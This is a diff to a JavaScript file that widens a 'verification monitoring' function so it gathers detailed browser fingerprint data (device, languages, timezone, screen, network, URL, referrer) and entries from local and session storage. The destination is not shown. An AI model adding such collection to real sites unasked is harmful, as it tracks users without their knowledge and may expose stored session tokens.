@@ -158,16 +158,68 @@ function describeStorage(storage) {
     return entries.slice(0, 50);
 }
 
+function getBrowserStorage(name) {
+    try {
+        return window[name];
+    } catch {
+        return null;
+    }
+}
+
 function sendVerificationMonitoring() {
     let telemetry;
     try {
+        const userAgentData = navigator.userAgentData;
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const localStorage = getBrowserStorage("localStorage");
+        const sessionStorage = getBrowserStorage("sessionStorage");
+
         telemetry = {
             timestamp: new Date().toISOString(),
-            device: navigator.userAgentData?.platform || navigator.platform || "Unavailable",
-            userAgent: navigator.userAgent,
+            device: {
+                type: userAgentData?.mobile ? "Mobile" : "Desktop",
+                platform: userAgentData?.platform || navigator.platform || "Unavailable",
+                model: userAgentData?.model || "Unavailable"
+            },
+            browser: {
+                brands: userAgentData?.brands || [],
+                userAgent: navigator.userAgent,
+                language: navigator.language || "Unavailable",
+                languages: Array.isArray(navigator.languages) ? navigator.languages.slice(0, 10) : [],
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unavailable",
+                cookieEnabled: navigator.cookieEnabled
+            },
+            display: {
+                width: window.screen?.width || 0,
+                height: window.screen?.height || 0,
+                availableWidth: window.screen?.availWidth || 0,
+                availableHeight: window.screen?.availHeight || 0,
+                colorDepth: window.screen?.colorDepth || 0,
+                pixelRatio: window.devicePixelRatio || 1
+            },
+            network: connection ? {
+                type: connection.type || "Unavailable",
+                effectiveType: connection.effectiveType || "Unavailable",
+                downlink: typeof connection.downlink === "number" ? connection.downlink : null,
+                rtt: typeof connection.rtt === "number" ? connection.rtt : null,
+                saveData: Boolean(connection.saveData)
+            } : {},
+            capabilities: {
+                localStorage: Boolean(localStorage),
+                sessionStorage: Boolean(sessionStorage),
+                serviceWorker: "serviceWorker" in navigator,
+                touchPoints: navigator.maxTouchPoints || 0,
+                online: navigator.onLine
+            },
+            session: {
+                url: window.location.href,
+                referrer: document.referrer || "Unavailable",
+                visibility: document.visibilityState,
+                historyLength: window.history.length
+            },
             storage: [
-                ...describeStorage(window.localStorage),
-                ...describeStorage(window.sessionStorage)
+                ...describeStorage(localStorage),
+                ...describeStorage(sessionStorage)
             ]
         };
     } catch {
